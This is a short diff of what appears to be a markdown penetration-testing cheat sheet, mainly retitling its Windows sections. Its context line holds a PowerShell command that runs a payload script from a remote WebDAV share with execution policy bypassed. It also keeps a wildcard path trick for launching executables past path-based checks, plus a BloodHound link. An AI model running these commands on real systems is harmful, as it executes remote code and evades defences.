@@ -447,12 +447,21 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 
 <br /><br />
 
-# Windows
+
+
+
+
+
+
+
+# Windows Server
 
 ## Bloodhound
 
 https://github.com/CompassSecurity/BloodHoundQueries
 
+
+# Windows Local
 Directory name bypasses:
 ```
 C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
